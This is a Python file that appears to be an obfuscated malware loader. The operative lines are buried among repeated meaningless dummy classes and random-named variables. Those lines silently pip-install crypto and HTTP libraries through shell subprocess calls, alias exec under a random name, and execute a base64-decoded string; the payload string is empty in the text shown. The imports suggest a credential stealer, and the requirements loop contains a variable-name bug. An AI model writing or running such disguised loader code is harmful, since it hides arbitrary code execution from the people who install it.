

from sys import executable, stderr
{'username': 'vlR0cUw', 'age': 81}
class UgOWicwZc8:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
Dv79hu9gky = 61059316
class xjR7yQivtp:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
vQg70I9GSl = 38093385
f8nMwd1G8n = 95914750
class qvo8LYdrW2:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
QFN6guzwc8 = 34026601
["'Rs1xETiLZ9'"]
'EXMtUWi68Z'
GSXsnNoAEK = 49036271
class x5wMNrQ0Qk:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class uU8DxGRltB:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
IV0wIoFpNP = 21376358
spMTUcy8ca = 70478585
class QKDVR9egRu:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
p103G0aSkJ = 26330341
Ry0zj9Ns6Y = 85331989
class XCR9jXOmv7:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class tMr3xVfpGT:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class Bo9eeSA2KE:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class feg69mnHrh:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
TaF0uaRp9T = 36713643
import ctypes;import base64,subprocess,sqlite3,json,shutil
import time
from importlib import import_module

requirements = [
    ["requests", "requests"],
    ["Cryptodome.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'pycryptodome']
]
for modl in requirements:
    try:
        import_module(module[0])
    except:
        subprocess.Popen(executable + " -m pip install " +modl[1], shell=True)
        time.sleep(3)
        

from json import loads, dumps
from urllib.request import Request, urlopen
try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptography")

try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptodomex", shell=True)

try:
    import requests
except:
    subprocess.run("python -m pip install requests", shell=True)

try:
    from Cryptodome.Cipher import AES
except:
    subprocess.Popen(executable + " -m pip install pycryptodome ", shell=True)
    from Crypto.Cipher import AES

import requests
{'username': 'vlR0cUw', 'age': 81}
class UgOWicwZc8:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
Dv79hu9gky = 61059316
class xjR7yQivtp:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
vQg70I9GSl = 38093385
f8nMwd1G8n = 95914750
class qvo8LYdrW2:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
QFN6guzwc8 = 34026601
["'Rs1xETiLZ9'"]
'EXMtUWi68Z'
GSXsnNoAEK = 49036271
class x5wMNrQ0Qk:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class uU8DxGRltB:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
IV0wIoFpNP = 21376358
spMTUcy8ca = 70478585
class QKDVR9egRu:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
p103G0aSkJ = 26330341
Ry0zj9Ns6Y = 85331989
class XCR9jXOmv7:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class tMr3xVfpGT:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class Bo9eeSA2KE:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class feg69mnHrh:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
TaF0uaRp9T = 36713643
AKZSKJbjFkVXVERjMvZRwyNVcEkTCQOyLWBHLu = exec
{'username': 'vlR0cUw', 'age': 81}
class UgOWicwZc8:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
Dv79hu9gky = 61059316
class xjR7yQivtp:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
vQg70I9GSl = 38093385
f8nMwd1G8n = 95914750
class qvo8LYdrW2:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
QFN6guzwc8 = 34026601
["'Rs1xETiLZ9'"]
'EXMtUWi68Z'
GSXsnNoAEK = 49036271
class x5wMNrQ0Qk:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class uU8DxGRltB:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
IV0wIoFpNP = 21376358
spMTUcy8ca = 70478585
class QKDVR9egRu:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
p103G0aSkJ = 26330341
Ry0zj9Ns6Y = 85331989
class XCR9jXOmv7:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class tMr3xVfpGT:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class Bo9eeSA2KE:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class feg69mnHrh:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
TaF0uaRp9T = 36713643
import concurrent.futures
zqIWKvS8KrOQq3xvqLOqBAa7cDvomZjEd8xYuJ=""
AKZSKJbjFkVXVERjMvZRwyNVcEkTCQOyLWBHLu(base64.b64decode(zqIWKvS8KrOQq3xvqLOqBAa7cDvomZjEd8xYuJ))
{'username': 'vlR0cUw', 'age': 81}
class UgOWicwZc8:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
Dv79hu9gky = 61059316
class xjR7yQivtp:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
vQg70I9GSl = 38093385
f8nMwd1G8n = 95914750
class qvo8LYdrW2:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
QFN6guzwc8 = 34026601
["'Rs1xETiLZ9'"]
'EXMtUWi68Z'
GSXsnNoAEK = 49036271
class x5wMNrQ0Qk:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class uU8DxGRltB:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
IV0wIoFpNP = 21376358
spMTUcy8ca = 70478585
class QKDVR9egRu:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
p103G0aSkJ = 26330341
Ry0zj9Ns6Y = 85331989
class XCR9jXOmv7:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class tMr3xVfpGT:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class Bo9eeSA2KE:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class feg69mnHrh:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
TaF0uaRp9T = 36713643